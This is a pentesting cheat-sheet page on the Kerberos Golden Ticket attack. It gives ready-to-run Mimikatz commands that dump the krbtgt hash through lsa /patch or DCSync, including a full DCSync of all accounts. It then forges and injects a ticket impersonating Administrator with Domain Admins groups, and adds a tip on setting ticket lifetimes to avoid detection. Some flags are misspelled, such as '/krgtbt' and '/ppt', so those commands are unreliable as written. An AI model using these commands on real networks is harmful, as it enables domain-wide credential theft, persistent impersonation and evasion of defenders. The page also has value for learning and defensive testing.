---
description: Golden Ticket
---

# Golden Ticket

> Golden ticket is used to gain persistance once we have achieved domain admin privileges. It is used to impersonate any user with any privileges.

**Some aspects:**

* It consists of abused step 3 and 4 from the kerberos scheme.
* When the client machine presents an encryped TGT to the KDC, the only validation is if the KDC can decrpyt it.
* We can use deleted or revoked accounts since user account validation is not done by KDC until TGT is older than 20mins.
* Single password change has no effect on this attack (a match is tried with previous hash).

### Steps

1. Extract krbtgt hash from DC (requieres Domain Admin privs):

```bash
#Using mimikatz
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName $COMPUTER_NAME #Delete -ComputerName if done in the DC

#Using DCSync
#Insted of executing mimikatz into the DC, we can use DCSync to extract information from the DC (needs domain admin privs):
Invoke-Mimikatz -Command '"lsadump::dcsync /user:$domain\krbtgt"'

##Complete DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /all /csv"'
```

2\. Generate a valid Golden Ticket on any machine (doesn't need any privs):

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:$DOMAIN_NAME /sid:$DOMAIN_SID /krgtbt:$NTLM_KRBTGT /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

#/ppt -> Injects the ticket in the current PS proccess. Can be changed with /ticket.
#/ticket -> Save the ticket in disk.
#/startoffset, /endin, /renewmax -> Try to match those with domain kerberos policy to avoid detection.
```

3\. List tickets:

```bash
klist
```
